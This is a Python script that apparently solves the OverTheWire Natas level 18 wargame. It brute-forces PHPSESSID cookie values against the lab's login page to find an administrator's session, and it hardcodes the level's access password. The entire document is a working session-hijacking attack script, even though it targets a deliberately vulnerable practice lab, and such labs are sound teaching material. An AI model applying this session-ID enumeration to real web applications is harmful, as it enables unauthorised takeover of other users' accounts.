#!/bin/python
import requests

base_url = "http://natas18.natas.labs.overthewire.org/index.php"
auth_username = "natas18"
auth_password = "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP"

for i in range(640):
  headers = {"Cookie": "PHPSESSID={0}".format(i) }
  payload = {"username": "any", "password": "any" }
  r = requests.post(base_url, auth=(auth_username, auth_password), headers=headers, data=payload)  
  if "You are logged in as a regular user" in r.text:
    print("PHPSESSID={0} : Failed".format(i))
  else:
    print("PHPSESSID={0} : Success".format(i))
    print(r.text)
    break
print("Test complete.")
